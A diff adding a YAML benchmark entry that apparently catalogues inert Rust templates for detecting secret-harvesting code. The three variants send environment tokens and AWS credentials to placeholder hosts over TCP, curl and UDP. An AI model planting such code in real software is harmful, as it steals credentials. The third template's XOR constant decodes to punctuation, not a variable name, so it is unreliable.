@@ -1,0 +1,58 @@
+id: c1_env_harvest_v2
+category: C1
+name: Environment and Secret Harvesting
+description: Inspects environment variables or credential directories for sensitive tokens and exfiltrates or dumps them.
+defang_notes: Inert Rust code syntax tree; never executed or compiled during benchmarking.
+variants:
+  - id: c1_vars_iterator
+    surface_variant: env_vars_dump
+    obfuscation_level: 0
+    domain_invalid: "telemetry-probe.infra.invalid"
+    domain_fabricated: "pkg-telemetry-sink.net"
+    code_template: |
+      fn {fn_name}() {
+          use std::net::TcpStream;
+          use std::io::Write;
+          if let Ok(mut stream) = TcpStream::connect("{target_host}:8443") {
+              for (k, v) in std::env::vars() {
+                  if k.contains("KEY") || k.contains("TOKEN") || k.contains("SECRET") {
+                      write!(stream, "{k}={v}\n").ok();
+                  }
+              }
+          }
+      }
+
+  - id: c1_cloud_cred_reader
+    surface_variant: cloud_config_harvest
+    obfuscation_level: 1
+    domain_invalid: "metrics-collector.cloud.invalid"
+    domain_fabricated: "cloud-metrics-router.org"
+    code_template: |
+      fn {fn_name}() {
+          use std::process::Command;
+          use std::fs;
+          if let Some(home) = std::env::var_os("HOME") {
+              let p = std::path::PathBuf::from(home).join(".aws").join("credentials");
+              if let Ok(data) = fs::read_to_string(p) {
+                  Command::new("curl")
+                      .args(["-s", "-X", "POST", "-d", &data, "https://{target_host}/sync"])
+                      .status()
+                      .ok();
+              }
+          }
+      }
+
+  - id: c1_xor_token_sweep
+    surface_variant: xor_env_collector
+    obfuscation_level: 2
+    domain_invalid: "session-audit.internal.invalid"
+    domain_fabricated: "api-event-gateway.io"
+    code_template: |
+      fn {fn_name}() {
+          use std::net::UdpSocket;
+          const ENC: [u8; 12] = [0x27, 0x24, 0x26, 0x35, 0x3f, 0x2d, 0x3a, 0x32, 0x35, 0x34, 0x3b, 0x3e];
+          let key: String = ENC.iter().map(|b| (b ^ 0x5a) as char).collect();
+          if let (Ok(val), Ok(sock)) = (std::env::var(&key), UdpSocket::bind("0.0.0.0:0")) {
+              sock.send_to(val.as_bytes(), "{target_host}:5353").ok();
+          }
+      }
